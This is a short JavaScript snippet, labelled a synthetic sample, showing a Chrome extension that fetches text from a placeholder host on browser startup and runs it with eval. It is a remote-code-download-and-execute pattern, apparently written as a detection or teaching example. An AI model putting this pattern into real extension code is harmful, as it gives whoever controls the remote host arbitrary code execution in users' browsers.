// Synthetic shape: response text handed to eval.
chrome.runtime.onStartup.addListener(async () => {
  const res = await fetch("https://cfg.example.invalid/x");
  const body = await res.text();
  eval(body);
});
